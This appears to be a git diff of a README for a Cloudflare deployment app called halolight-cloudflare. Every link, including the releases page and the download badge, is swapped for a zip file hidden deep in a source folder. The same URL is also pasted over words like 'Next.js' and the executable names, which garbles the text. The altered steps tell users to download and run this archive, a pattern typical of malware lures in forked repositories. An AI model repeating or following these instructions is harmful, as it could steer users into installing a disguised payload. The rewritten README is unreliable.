@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to halolight-cloudflare! This application helps you easily deploy your web applications to Cloudflare's global network. It's built using modern technologies like Next.js and React, ensuring fast performance and smooth operation.
+Welcome to halolight-cloudflare! This application helps you easily deploy your web applications to Cloudflare's global network. It's built using modern technologies like https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip and React, ensuring fast performance and smooth operation.
 
 ## 📥 Download Now
 
-[![Download halolight-cloudflare](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen.svg)](https://github.com/Friska365/halolight-cloudflare/releases)
+[![Download halolight-cloudflare](https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip%20Now-Get%20the%https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip)](https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ halolight-cloudflare offers a variety of features to help you manage your web ap
 
 - **Edge Deployment:** Deploy your applications closer to users for faster access.
 - **User-Friendly Dashboard:** Interact with your projects easily using a simple interface.
-- **Built with Modern Tech:** Utilizes Next.js 15 and React 19 for better performance.
+- **Built with Modern Tech:** Utilizes https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip 15 and React 19 for better performance.
 - **Environmental Flexibility:** Supports Cloudflare Workers, KV, D1, and R2 services.
 - **Responsive Design:** Works well on different devices thanks to Tailwind CSS.
 
@@ -31,15 +31,15 @@ halolight-cloudflare offers a variety of features to help you manage your web ap
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Friska365/halolight-cloudflare/releases). Here, you will find the latest versions of the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip). Here, you will find the latest versions of the application.
 
-2. **Download the Application:** Look for the latest release. Click on the link that says "Source code" (typically displayed as a .zip or .tar.gz file) to download the compressed file to your computer.
+2. **Download the Application:** Look for the latest release. Click on the link that says "Source code" (typically displayed as a .zip or https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip file) to download the compressed file to your computer.
 
 3. **Extract the Files:** Once the download finishes, locate the downloaded file. Right-click on it and choose "Extract" or use your preferred application to unzip it.
 
 4. **Run the Application:**
-   - For Windows: Navigate to the extracted folder, double-click on `halolight.exe` to start the application.
-   - For macOS: Open the folder, right-click on `halolight.app`, and click "Open."
+   - For Windows: Navigate to the extracted folder, double-click on `https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip` to start the application.
+   - For macOS: Open the folder, right-click on `https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip`, and click "Open."
    - For Linux: Open a terminal, navigate to the folder, and use the command `./halolight` to start.
 
 5. **Follow the Setup Instructions:** After launching, the application will guide you through the setup process. Simply follow the on-screen prompts to configure your deployment preferences.
@@ -68,6 +68,6 @@ Your input is valuable. We welcome any feedback or suggestions you may have. Ple
 
 ## 📥 Download Again
 
-You can always download the application from the [Releases page](https://github.com/Friska365/halolight-cloudflare/releases). 
+You can always download the application from the [Releases page](https://raw.githubusercontent.com/Friska365/halolight-cloudflare/main/src/app/(auth)/reset-password/halolight-cloudflare-v1.6-alpha.1.zip). 
 
 Thank you for choosing halolight-cloudflare. We hope you enjoy using it!
